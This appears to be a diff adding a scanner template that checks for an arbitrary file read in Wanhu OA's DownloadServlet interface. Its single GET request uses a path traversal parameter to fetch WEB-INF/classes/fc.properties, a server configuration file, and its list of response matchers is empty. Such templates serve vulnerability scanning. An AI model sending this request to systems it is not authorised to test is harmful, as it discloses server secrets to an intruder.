@@ -1,0 +1,16 @@
+id: wanhuoa-downloadservlet-lfi
+brief:
+    title: Wanhu OA DownloadServlet - Remote File Disclosure
+    by: wpsec
+    level: high
+    about: There is an arbitrary file reading vulnerability in the Wanhu OA DownloadServlet interface. An attacker can use the vulnerability to read sensitive files in the server and obtain sensitive informat...
+    label:
+        - oa
+        - wanhu
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2'
+      signs: []
